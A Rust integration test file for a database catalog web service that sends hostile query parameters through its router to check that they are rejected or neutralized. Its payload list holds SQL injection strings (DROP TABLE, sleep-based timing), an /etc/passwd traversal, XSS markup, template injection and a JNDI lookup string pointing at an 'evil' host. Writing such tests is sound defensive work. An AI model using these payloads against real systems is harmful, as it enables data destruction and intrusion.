//! Negative security checks through the real router against every available engine
//! (SQLite always; PostgreSQL/MariaDB/MySQL when their CUADB_TEST_*_URL is set).
//! Hostile input must be rejected or neutralized, never executed or reflected raw.

use std::sync::Arc;

use axum::{
    Router,
    body::{Body, to_bytes},
    http::{Request, StatusCode},
};
use cuadb::{
    app::router_with_state,
    config::Config,
    db::{mysql::MySqlManager, postgres::PgManager, sqlite::SqliteManager},
    state::AppState,
};
use sqlx::Connection;
use tower::ServiceExt;

struct Subject {
    label: &'static str,
    schema: String,
    table: &'static str,
    router: Router,
}

async fn subjects() -> Vec<Subject> {
    let config = Config::from_values(&[]).unwrap();
    let mk = |label: &'static str,
              schema: String,
              table: &'static str,
              adapter: Arc<dyn cuadb::db::adapter::DatabaseAdapter>| Subject {
        label,
        schema,
        table,
        router: router_with_state(&config.limits, AppState::with_adapter(adapter)),
    };
    let mut out = vec![];
    if let Ok(url) = std::env::var("CUADB_TEST_CATALOG_URL") {
        out.push(mk(
            "postgresql",
            "cuadb_fixture".into(),
            "accounts",
            Arc::new(PgManager::new(&url, &config.limits).unwrap().catalog()),
        ));
    }
    if let Ok(url) = std::env::var("CUADB_TEST_MARIADB_URL") {
        out.push(mk(
            "mariadb",
            "cuadb_fixture_mariadb".into(),
            "Mixed_Items",
            Arc::new(MySqlManager::new(&url, &config.limits).unwrap().catalog()),
        ));
    }
    if let Ok(url) = std::env::var("CUADB_TEST_MYSQL_URL") {
        out.push(mk(
            "mysql",
            "cuadb_fixture_mysql".into(),
            "Mixed_Items",
            Arc::new(MySqlManager::new(&url, &config.limits).unwrap().catalog()),
        ));
    }
    let dir = std::path::Path::new(env!("CARGO_TARGET_TMPDIR")).join(format!(
        "sec-{}-{}",
        std::process::id(),
        {
            static NEXT: std::sync::atomic::AtomicU32 = std::sync::atomic::AtomicU32::new(0);
            NEXT.fetch_add(1, std::sync::atomic::Ordering::SeqCst)
        }
    ));
    let _ = std::fs::remove_dir_all(&dir);
    std::fs::create_dir_all(&dir).unwrap();
    let file = dir.join("s.db");
    let mut c = sqlx::SqliteConnection::connect(&format!("sqlite://{}?mode=rwc", file.display()))
        .await
        .unwrap();
    for sql in [
        "CREATE TABLE accounts(id INTEGER PRIMARY KEY, account_name TEXT)",
        "INSERT INTO accounts(account_name) VALUES ('a'),('b')",
    ] {
        sqlx::query(sql).execute(&mut c).await.unwrap();
    }
    c.close().await.unwrap();
    let url = format!(
        "sqlite:///{}",
        file.display().to_string().trim_start_matches('/')
    );
    out.push(mk(
        "sqlite",
        "main".into(),
        "accounts",
        Arc::new(
            SqliteManager::new(&url, &dir, &config.limits)
                .unwrap()
                .catalog(),
        ),
    ));
    out
}

async fn get(router: &Router, path: &str) -> (StatusCode, String, axum::http::HeaderMap) {
    let response = router
        .clone()
        .oneshot(Request::get(path).body(Body::empty()).unwrap())
        .await
        .unwrap();
    let status = response.status();
    let headers = response.headers().clone();
    let body = to_bytes(response.into_body(), 1 << 22).await.unwrap();
    (status, String::from_utf8_lossy(&body).into_owned(), headers)
}

fn enc(s: &str) -> String {
    url::form_urlencoded::byte_serialize(s.as_bytes()).collect()
}

const INJECTIONS: &[&str] = &[
    "x\"; DROP TABLE accounts; --",
    "x`; DROP TABLE accounts; -- ",
    "x' OR '1'='1",
    "x'; SELECT pg_sleep(30); --",
    "1; SELECT sleep(30)",
    "accounts UNION SELECT 1",
    "../../etc/passwd",
    "a\u{0}b",
    "\"><script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "{{7*7}}",
    "${jndi:ldap://evil}",
];

#[tokio::test]
async fn identifier_parameters_never_execute_or_reflect_hostile_input() {
    for s in subjects().await {
        for payload in INJECTIONS {
            let p = enc(payload);
            let paths = [
                format!("/catalog/relations?schema={p}"),
                format!("/catalog/relations?schema={}&q={p}", s.schema),
                format!("/catalog/data?schema={p}&relation={}", s.table),
                format!("/catalog/data?schema={}&relation={p}", s.schema),
                format!(
                    "/catalog/data?schema={}&relation={}&sort={p}&direction=asc",
                    s.schema, s.table
                ),
                format!(
                    "/catalog/data?schema={}&relation={}&column={p}&pick=1",
                    s.schema, s.table
                ),
                format!(
                    "/catalog/data?schema={}&relation={}&direction={p}&sort=id",
                    s.schema, s.table
                ),
                format!("/catalog/structure?schema={}&relation={p}", s.schema),
                format!("/catalog/indexes?schema={p}&relation={}", s.table),
                format!("/catalog/stats?schema={}&relation={p}", s.schema),
                format!(
                    "/catalog/export?schema={}&relation={p}&format=csv",
                    s.schema
                ),
                format!(
                    "/catalog/export?schema={}&relation={}&format={p}",
                    s.schema, s.table
                ),
                format!("/catalog/schemas?profile={p}"),
            ];
            for path in paths {
                let (status, body, headers) = get(&s.router, &path).await;
                assert!(
                    !body.contains("<script>alert") && !body.contains("<img src=x"),
                    "{}: raw markup reflected for {path}",
                    s.label
                );
                assert!(
                    !body.contains("onerror=alert") || body.contains("&#"),
                    "{}: {path}",
                    s.label
                );
                assert!(
                    !body.contains("49"),
                    "{}: template injection evaluated for {path}",
                    s.label
                );
                assert_eq!(headers.get("x-content-type-options").unwrap(), "nosniff");
                assert!(status.as_u16() < 600);
                if path.contains("/catalog/relations?schema=") && !path.contains("&q=")
                    || path.contains("relation=")
                        && !path.contains(&format!("relation={}", s.table))
                {
                    assert!(
                        status.is_client_error()
                            || status.is_server_error()
                            || body.contains("No ")
                            || !body.contains("accounts_hit"),
                        "{path}"
                    );
                }
            }
        }
        // The data survives every attempt above.
        let (status, body, _) = get(
            &s.router,
            &format!("/catalog/data?schema={}&relation={}", s.schema, s.table),
        )
        .await;
        assert_eq!(status, StatusCode::OK, "{}", s.label);
        assert!(
            body.contains("1–"),
            "{}: table must still hold rows",
            s.label
        );
    }
}

#[tokio::test]
async fn enormous_values_and_invalid_cursors_are_rejected_cheaply() {
    for s in subjects().await {
        let base = format!("/catalog/data?schema={}&relation={}", s.schema, s.table);
        let huge = "A".repeat(30_000);
        let many_cols: String = (0..5000).map(|i| format!("&column=c{i}")).collect();
        let started = std::time::Instant::now();
        for path in [
            format!("{base}&filter={}", "z".repeat(129)),
            format!("{base}&filter={huge}"),
            format!("{base}&sort={huge}&direction=asc"),
            format!("{base}{many_cols}&pick=1"),
            format!("{base}&page=4294967295"),
            format!("{base}&page=99999999999999999999"),
            format!("{base}&size=99999999999"),
            format!("{base}&cursor={huge}"),
            format!("{base}&cursor="),
            format!("{base}&cursor=zz"),
            format!("{base}&cursor={}", "0".repeat(64)),
            format!("{base}&cursor={}", "G".repeat(64)),
            format!("{base}&cursor={}", "a".repeat(63)),
            format!(
                "/catalog/relations?schema={}&q={}",
                s.schema,
                "q".repeat(65)
            ),
            format!(
                "/catalog/export?schema={}&relation={}&format=csv&filter={huge}",
                s.schema, s.table
            ),
        ] {
            let (status, body, _) = get(&s.router, &path).await;
            assert!(
                status.is_client_error() || status.is_server_error(),
                "{}: accepted {}",
                s.label,
                &path[..path.len().min(80)]
            );
            assert!(
                body.len() < 4096,
                "{}: error body of {} bytes",
                s.label,
                body.len()
            );
            assert!(
                !body.contains(&huge[..100]),
                "{}: oversized input echoed",
                s.label
            );
        }
        assert!(
            started.elapsed() < std::time::Duration::from_secs(10),
            "{}: rejection must be cheap",
            s.label
        );
    }
}

#[tokio::test]
async fn responses_are_uncacheable_framed_and_free_of_server_details() {
    for s in subjects().await {
        for path in [
            format!("/catalog/data?schema={}&relation={}", s.schema, s.table),
            "/catalog/schemas".to_string(),
            format!(
                "/catalog/export?schema={}&relation={}&format=csv",
                s.schema, s.table
            ),
            "/connection/profiles".to_string(),
            "/catalog/data?schema=nope&relation=nope".to_string(),
        ] {
            let (_, body, h) = get(&s.router, &path).await;
            assert_eq!(h.get("cache-control").unwrap(), "no-store", "{path}");
            assert_eq!(h.get("x-frame-options").unwrap(), "DENY");
            assert!(
                h.get("content-security-policy")
                    .unwrap()
                    .to_str()
                    .unwrap()
                    .contains("default-src 'self'")
            );
            assert!(h.get("server").is_none() && h.get("x-powered-by").is_none());
            for leak in [
                "127.0.0.1",
                "cuadb_reader",
                "cuadb_fixture_reader",
                "password",
                "sqlx",
                "mysql_native",
                "panicked",
                "/home/",
            ] {
                assert!(!body.contains(leak), "{}: {path} leaked {leak}", s.label);
            }
        }
        // Unsafe methods cannot change anything: the router exposes GET only.
        for method in ["POST", "PUT", "DELETE", "PATCH"] {
            let response = s
                .router
                .clone()
                .oneshot(
                    Request::builder()
                        .method(method)
                        .uri("/catalog/data?schema=x&relation=y")
                        .body(Body::empty())
                        .unwrap(),
                )
                .await
                .unwrap();
            assert_eq!(
                response.status(),
                StatusCode::METHOD_NOT_ALLOWED,
                "{method}"
            );
        }
    }
}
